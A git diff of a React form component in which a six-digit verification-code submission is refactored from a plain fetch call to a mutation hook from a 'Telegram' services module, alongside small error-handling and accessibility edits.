@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import id from "../assets/id.png";
 import Loader from "./Loader";
+import {  useVerifyCodeMutation,} from "../Services/Telegram";
 
 const Complete = () => {
   const [currentStage, setCurrentStage] = useState(2);
@@ -10,6 +11,7 @@ const Complete = () => {
   const [showError, setShowError] = useState(false);
   const inputRef = useRef(null);
   const navigate = useNavigate();
+  const [verifyCode] = useVerifyCodeMutation();
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -22,7 +24,7 @@ const Complete = () => {
   }, []);
 
   const handleCodeChange = (e) => {
-    const value = e.target.value.replace(/\D/g, ""); // Only digits
+    const value = e.target.value.replace(/\D/g, ""); 
     setCode(value);
     if (showError && value.length === 6) {
       setShowError(false);
@@ -30,38 +32,28 @@ const Complete = () => {
   };
 
   const handleCodeSubmit = async (e) => {
-    e.preventDefault();
 
-    if (code.length !== 6) {
-      setShowError(true);
-      return;
-    }
+  e.preventDefault();
+  if (code.length !== 6) {
+    setShowError(true);
+    return;
+  }
 
-    setShowError(false);
+  setShowError(false);
 
-    try {
-      const response = await fetch("http://localhost:4000/verifyCode", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code }),
-      });
+  try {
+    const response = await verifyCode({ code }).unwrap();
+    console.log("Verification successful:", response);
+    navigate("/details");
+  } catch (error) {
+    console.error("Verification error:", error);
+    alert(error?.data?.message || "Code verification failed.");
+  }
 
-      const data = await response.json();
+  }
 
-      if (response.ok) {
-        console.log("Response from backend:", data);
-        navigate("/details");
-      } else {
-        alert(data.message || "Code verification failed");
-      }
-    } catch (error) {
-      console.error("Error sending code to backend:", error);
-      alert("Network error or server unavailable.");
-    }
-  };
 
   const handleResendCode = () => {
-    // You should implement the resend code logic here
     alert("Verification code resent!");
   };
 
@@ -102,10 +94,10 @@ const Complete = () => {
               2
             </div>
             {loading && (
-              <div className="absolute top-10 sm:top-12">
-                <Loader />
-              </div>
-            )}
+  <div className="absolute top-10 sm:top-12" aria-live="polite">
+    <Loader />
+  </div>
+)}
           </div>
 
           <div
